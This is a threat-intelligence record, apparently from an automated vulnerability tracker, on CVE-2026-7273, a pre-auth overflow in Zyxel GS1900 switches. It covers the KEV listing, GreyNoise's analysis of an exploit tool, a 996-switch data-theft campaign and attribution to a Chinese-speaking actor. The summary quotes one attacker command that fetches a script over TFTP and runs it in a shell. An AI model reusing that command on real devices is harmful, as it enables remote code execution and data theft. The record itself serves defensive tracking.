    discovery_trace: "first seen at: kev_window_diff.py mandatory KEV disposition tasking (CVE-2026-7273 flagged as the sole NOT-COVERED KEV addition in the 26h window) → CISA KEV JSON, URL https://www.cisa.gov/known-exploited-vulnerabilities-catalog → primary: Zyxel PSIRT advisory, URL https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-stack-based-buffer-overflow-vulnerability-in-gs1900-series-switches-06-16-2026 → primary: NVD CVE record, URL https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-7273 → the KEV notes field named GreyNoise as the exploitation-evidence source → primary: GreyNoise blog, URL https://www.greynoise.io/blog/open-season-on-kapibala-attacker-steals-government-records-wordpress-exploitation → pivot for actor-overlap context: Acronis TRU, URL https://www.acronis.com/en/tru/posts/red-heron-exploits-gitea-n-day-flaw-in-multinational-campaign-exposing-new-linux-rootkit/"
    summary: |
      CVE-2026-7273 (CVSS3.1 8.8, AV:A/AC:L/PR:N/UI:N — adjacent-network, no auth) is a stack-based buffer
      overflow (CWE-121) in the CGI program of Zyxel GS1900 series smart-managed switch firmware, letting a
      LAN-based unauthenticated attacker execute OS commands via a crafted HTTP request. Zyxel disclosed and
      patched it on 2026-06-16 across ten GS1900 models (GS1900-8, -8HP, -10HP, -16, -24, -24E, -24EP,
      -24HPv2, -48, -48HPv2), each fixed at a per-model "…(x).2C0" build one increment above the vulnerable
      "…(x).1C0 and earlier" baseline. CISA added it to KEV on 2026-09-21 (3-day remediation due-date
      2026-09-24) on the strength of GreyNoise's own sensor-grid research, published the same day: GreyNoise
      has tracked a single malicious cyber actor (MCA) — assessed a suspected Chinese speaker, likely
      operating in UTC+8, based on copious Chinese-language code comments and operational timing — since May
      2026, and states the actor is "the same or related to" Red Heron, a Chinese-speaking, PRC-linked cluster
      Acronis TRU profiled on 2026-09-13 (Gitea CVE-2026-60004 n-day exploitation, JITTERLY Linux C2 implant,
      SIXZUT LD_PRELOAD rootkit), based on shared C2 domain, malware family and other TTPs — a claim GreyNoise
      itself frames as an assessment, not a confirmed identity match. GreyNoise reverse-engineered a
      PyArmor-6.7.5-obfuscated Python exploit tool titled "Zyxel GS1900 Pre-Auth RCE" offering two exploitation
      modes — a deterministic single-request GOT-overwrite mode and an ASLR brute-force stack mode (~2,048
      average attempts) — with command-line overrides for libc base address, GOT offsets and the target
      firmware's `system()` offset, meaning the tool is built to be re-targeted across the whole affected
      firmware range (2.10–2.90 observed against GS1900-24) rather than hard-coded to one build. On or about
      17 August 2026 the actor used this tool to exploit and exfiltrate configuration data, networking
      information and hashed root-level credentials from 996 Zyxel GS1900 switches across 48 countries; the
      post-exploitation command chain used the switch's on-device shell to fetch a TFTP-delivered collector
      script (`sh -c tftp -gr c -l /1 <redacted-IP> 6969;/bin/sh /1`) and staged the harvested data to
      `/home/web/tmp/info.txt` for retrieval. Although credentials were hashed, 564 of the 996 victim switches
      (57%) were still running factory-default credentials, meaning the exfiltrated hash was often
      unnecessary — the default password alone gave the actor durable re-entry. GreyNoise frames the Zyxel
      campaign as one prong of a broader, opportunistic multi-CVE operation by the same actor: an
      already-KEV-listed Ubiquiti UniFi OS RCE chain (CVE-2026-34908/34909/34910) attempted in June 2026, and
      a WordPress WP2Shell exploit chain (CVE-2026-63030/CVE-2026-60137, already disclosed and covered
      elsewhere) that from 20 July onward compromised at least 49 organizations in 29 countries, with the
      single worst case — an unnamed Western government — losing over 18,000 sensitive database records; a
      full forensic timeline in GreyNoise's report shows the actor's post-exploitation tooling (AMSI-bypass
      variants, GodPotato-based token theft, an in-process SYSTEM-impersonation PowerShell script) bears
      hallmarks GreyNoise attributes to LLM-assisted code generation (near-duplicate script iterations with
      superficial-only changes, heavy inline Chinese-language commentary explaining each attempted technique).
    region_nexus: "global; 996 victim switches across 48 countries per GreyNoise, no Swiss victim named or excluded; Zyxel GS1900 is a widely-deployed SMB/branch-office smart-managed switch line plausible in Swiss cantonal/communal IT estates"
    primary_sector_nexus: "indirect — one confirmed government victim (unnamed, non-Swiss) in the same actor's WordPress prong; network-edge infrastructure relevant to any public-sector branch-office deployment"
